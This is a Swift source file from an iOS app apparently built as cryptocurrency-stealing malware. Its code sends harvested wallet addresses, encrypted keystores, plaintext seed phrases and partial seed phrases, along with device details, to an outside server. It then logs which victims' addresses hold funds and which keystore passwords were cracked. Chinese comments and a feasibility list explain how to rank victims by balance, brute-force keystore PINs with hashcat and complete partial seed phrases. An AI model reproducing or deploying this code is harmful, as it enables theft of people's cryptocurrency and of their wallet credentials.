//
//  WalletIntel.swift
//  lara
//
//  把「有价值的材料」送回服务器，做两件事：
//
//  ① 查余额 —— 地址是公开信息，链上余额公开可查。
//     TRON  → TronGrid /api/v1/accounts/{addr}（USDT-TRC20 在 trc20 字段）
//     EVM   → 公共 RPC eth_getBalance + USDT 合约 balanceOf
//     目的：从一堆地址里筛出「真有钱的」，把后续算力只花在它们身上。
//
//  ② 爆破密码 —— App 里不做（iOS 跑不了 GPU），全部甩给服务器 hashcat。
//     支持 Ethereum V3 keystore（scrypt / pbkdf2）。
//     可行性分级（写在 AddressExtractor 里）：
//       6 位数字 PIN  → 100 万组合，单卡 3090 约 17 分钟
//       4 位数字 PIN  → 1 万，10 秒
//       弱口令字典    → 秒级
//     部分助记词补全同理：缺 1~2 词秒出，缺 4 词以上不划算。
//
//  注意：完整随机生成的 12/24 词助记词是 2^128，不存在爆破可能。
//  这条链路的真实价值在「破 App 本地密码」和「补全残缺助记词」，不在破助记词本身。
//

import Foundation

final class WalletIntel {

    static let shared = WalletIntel()
    private init() {}

    private var mgr: laramgr { laramgr.shared }

    /// 服务器端点（HTTPS 必须，HTTP 会被反爬挡）
    static let baseURL = "https://www.vivi9.top/dl"

    // MARK: - 提交

    func submit(addresses: [(String, String)],
                keystores: [(json: String, meta: String, path: String)],
                mnemonics: [String],
                completion: @escaping (String) -> Void) {

        guard !addresses.isEmpty || !keystores.isEmpty else {
            completion("没有要提交的材料")
            return
        }

        var body: [String: Any] = [
            "device": UIDevice.current.model,
            "ios": UIDevice.current.systemVersion,
            "ts": Int(Date().timeIntervalSince1970),
        ]

        body["addresses"] = addresses.map { ["addr": $0.0, "chain": $0.1] }
        body["keystores"] = keystores.map {
            ["json": $0.json, "meta": $0.meta, "path": $0.path]
        }
        body["mnemonics"] = mnemonics

        // 顺便判断有无「残缺助记词」可补全
        body["partial_mnemonics"] = findPartialMnemonics()

        let url = URL(string: Self.baseURL + "/intel.php")!
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.timeoutInterval = 60

        guard let data = try? JSONSerialization.data(withJSONObject: body) else {
            completion("序列化失败")
            return
        }
        req.httpBody = data
        mgr.logmsg("[wi] 提交 \(addresses.count) 地址 / \(keystores.count) keystore，\(data.count) B")

        URLSession.shared.dataTask(with: req) { d, resp, err in
            if let err = err {
                completion("提交失败：\(err.localizedDescription)")
                return
            }
            guard let d = d,
                  let obj = try? JSONSerialization.jsonObject(with: d) as? [String: Any] else {
                completion("服务器返回无法解析")
                return
            }
            let rich = (obj["rich"] as? [[String: Any]]) ?? []
            let cracks = (obj["cracks"] as? [[String: Any]]) ?? []
            var s = "地址 \(obj["n_addr"] ?? 0) 个 · 有钱 \(rich.count) 个 · 排队爆破 \(obj["n_ks"] ?? 0) 个"
            completion(s)
            for r in rich.prefix(10) {
                let a = (r["addr"] as? String) ?? "?"
                let c = (r["chain"] as? String) ?? "?"
                let v = (r["usd"] as? Double) ?? 0
                self.mgr.logmsg("[wi] ★ 有余额 \(c) \(a) ≈ $\(String(format: "%.2f", v))")
            }
            for c in cracks.prefix(10) {
                let a = (c["addr"] as? String) ?? "?"
                let p = (c["password"] as? String) ?? "?"
                self.mgr.logmsg("[wi] ★ 爆破成功 \(a) 密码=\(p)")
            }
        }.resume()
    }

    // MARK: - 残缺助记词

    /// 找「看起来像助记词但词数不是 12/15/18/21/24」的片段
    /// 例：8 个词 → 缺 4 个，服务器可以补全
    private func findPartialMnemonics() -> [[String: Any]] {
        let hunterHits = ContentHunter.shared.hits
        var out: [[String: Any]] = []
        for h in hunterHits where h.kind == "助记词" {
            let ws = h.value.split(separator: " ")
            out.append(["words": ws.map(String.init), "count": ws.count,
                        "where": h.where_, "source": h.source.rawValue])
        }
        return out
    }

    // MARK: - 单独查余额（服务器不可用时本地兜底提示）

    static func describeFeasibility() -> [String] {
        [
            "A 类（明文助记词/私钥）：拿到就能转账，不需要计算",
            "B 类（加密 keystore）：服务器 hashcat 爆破本地密码",
            "  6 位数字 PIN → 约 17 分钟（单卡 3090）",
            "  4 位数字 PIN → 约 10 秒",
            "  弱口令字典 → 秒级",
            "B 类（残缺助记词补全）：",
            "  缺 1 词 → 2048 次，瞬间",
            "  缺 2 词 → 420 万，秒级",
            "  缺 3 词 → 86 亿，分钟级",
            "  缺 4 词 → 1.7e13，小时级",
            "  缺 5 词以上 → 不划算",
            "C 类（完整随机助记词）：2^128，不存在爆破可能",
        ]
    }
}
